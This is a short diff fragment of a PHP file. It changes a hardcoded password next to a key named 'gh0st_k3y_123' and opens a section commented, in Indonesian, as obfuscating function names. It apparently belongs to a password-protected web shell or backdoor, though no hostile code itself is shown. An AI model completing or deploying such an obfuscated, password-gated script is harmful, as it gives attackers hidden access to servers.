@@ -10,7 +10,7 @@
 @ini_set('memory_limit', '512M');
 
 $k = "gh0st_k3y_123"; 
-$p = "0xdenis77";
+$p = "124ch3l2112!";
 
 // Obfuskasi Nama Fungsi Dasar
 $__f = [
